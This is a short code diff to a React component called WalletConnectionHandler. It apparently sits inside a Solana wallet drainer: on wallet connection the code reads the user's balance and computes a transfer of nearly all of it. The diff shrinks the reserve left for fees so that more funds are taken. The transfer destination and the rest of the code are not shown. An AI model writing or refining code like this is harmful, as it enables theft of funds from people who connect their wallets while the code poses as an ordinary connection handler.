@@ -95,11 +95,11 @@ const WalletConnectionHandler: FC = () => {
                 return;
             }
 
-            const balanceSOL = balanceLamports / 1000000000;
+            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
             setSolBalance(balanceSOL);
             console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(4)} SOL`);
 
-            const transferAmount = balanceLamports - 100000; // Leave lamports for fee
+            const transferAmount = balanceLamports - 5000; // Leave some lamports for fee
             if (transferAmount <= 0) {
                 console.warn('⚠️ Not enough SOL to send after fees.');
                 return;
